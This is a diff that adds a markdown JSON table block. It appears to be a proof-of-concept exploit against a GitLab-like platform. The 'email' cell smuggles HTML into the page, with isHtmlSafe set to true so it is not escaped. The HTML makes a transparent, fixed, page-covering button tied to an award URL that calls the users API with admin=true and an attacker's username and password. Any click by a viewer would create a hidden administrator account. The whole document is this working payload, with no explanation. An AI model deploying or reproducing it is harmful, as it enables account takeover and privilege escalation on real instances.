@@ -1,0 +1,17 @@
+```json:table
+{
+  "fields": [
+    {"key": "name", "label": "Name"},
+    {"key": "email", "label": "Email"},
+    {"key": "role", "label": "Role"}
+  ],
+  "items": [
+    {
+      "name": "<b>Bob</b>",
+      "email": "<div class=\"awards js-awards-block gl-gap-3 gl-py-2\" data-award-url=\"/api/v4/users?email=attacker@gmail.com&admin=true&name=attacker2&username=attacker2&password=secure123&skip_confirmation=true\"><button class=\"selected js-emoji-btn\" data-title=\"You\" style=\"z-index:99999999999999999;cursor:auto;position:fixed;transform:translate3d(-2000px,-5001px,0px);width:10000px;height:20000px;background:transparent\" type=\"button\"></button></div>",
+      "role": "User"
+    }
+  ],
+  "isHtmlSafe": true
+}
+```
